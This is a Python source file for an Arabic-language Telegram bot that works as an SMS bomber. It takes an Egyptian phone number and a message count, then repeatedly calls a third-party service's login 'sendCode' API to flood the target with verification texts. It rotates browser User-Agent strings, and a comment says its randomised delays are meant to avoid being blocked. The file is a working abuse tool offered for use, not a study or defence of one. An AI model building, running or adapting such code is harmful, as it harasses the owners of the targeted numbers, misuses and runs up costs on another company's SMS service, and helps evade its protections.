import os
import logging
import asyncio
import random
import string
import httpx

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# يقرأ التوكن من متغيرات البيئة في Railway
TOKEN = os.environ.get('TOKEN')

# إعدادات عامة
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)
GET_NUMBER, GET_COUNT = range(2)
API_URL = "https://api.twistmena.com/music/Dlogin/sendCode"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
]

def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
    }

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = "أهلاً بك! 🚀\n\nلبدء إرسال الرسائل، استخدم الأمر: /sms"
    await update.message.reply_text(welcome_text)

async def start_sms_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("📞 أرسل لي رقم الهاتف (11 رقمًا يبدأ بـ 01).")
    return GET_NUMBER

async def get_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    number = update.message.text
    if number and number.startswith("01") and len(number) == 11:
        context.user_data['phone_number'] = "2" + number
        await update.message.reply_text("🔢 ممتاز. الآن أرسل عدد الرسائل (رقم بين 1 و 100).")
        return GET_COUNT
    else:
        await update.message.reply_text("❌ رقم غير صحيح. أرسل رقمًا مصريًا صحيحًا.")
        return GET_NUMBER

async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    number = context.user_data.get('phone_number')
    sms_count = context.user_data.get('sms_count')

    if not number or not sms_count:
        logger.warning("run_attack called without phone_number or sms_count.")
        return

    await context.bot.send_message(chat_id, text=f"🚀 حسنًا! بدأت إرسال {sms_count} رسالة إلى {number} في الخلفية...")

    success_count = 0
    failure_count = 0

    async with httpx.AsyncClient() as client:
        for i in range(sms_count):
            payload = {"dial": number, "randomValue": ''.join(random.choices(string.ascii_letters + string.digits, k=6))}
            headers = get_random_headers()
            try:
                response = await client.post(API_URL, headers=headers, json=payload, timeout=20.0)
                if response.status_code == 200:
                    success_count += 1
                else:
                    failure_count += 1
                    logger.warning(f"API returned status {response.status_code} for {number}. Response: {response.text}")
            except httpx.ConnectTimeout:
                logger.error("Connection to SMS API timed out.")
                failure_count += 1
            except Exception as e:
                logger.error(f"An unexpected error occurred during attack: {e}")
                failure_count += 1
            
            # !! التعديل الرئيسي: زيادة وقت الانتظار لتقليل احتمالية الحظر !!
            await asyncio.sleep(random.uniform(4.0, 8.0)) # الانتظار من 4 إلى 8 ثواني

    summary_text = f"📊 **اكتملت العملية للرقم {number}** 📊\n- ✅ **نجاح:** `{success_count}`\n- ❌ **فشل:** `{failure_count}`"
    await context.bot.send_message(chat_id, text=summary_text, parse_mode='Markdown')

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        sms_count = int(update.message.text)
        if not (1 <= sms_count <= 100):
            await update.message.reply_text("❌ العدد غير مسموح به. أدخل رقمًا بين 1 و 100.")
            return GET_COUNT
        
        context.user_data['sms_count'] = sms_count
        asyncio.create_task(run_attack(update, context))
        return ConversationHandler.END
    except (ValueError, TypeError):
        await update.message.reply_text("❌ هذا ليس رقمًا صحيحًا.")
        return GET_COUNT

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data.clear()
    await update.message.reply_text("👍 تم إلغاء العملية الحالية.")
    return ConversationHandler.END
    
def main() -> None:
    if not TOKEN:
        logger.critical("خطأ فادح: متغير البيئة TOKEN غير موجود! البوت لن يعمل.")
        return
        
    application = Application.builder().token(TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("sms", start_sms_command)],
        states={
            GET_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_number)],
            GET_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        conversation_timeout=300 
    )
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(conv_handler)
    
    print("🚀 Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
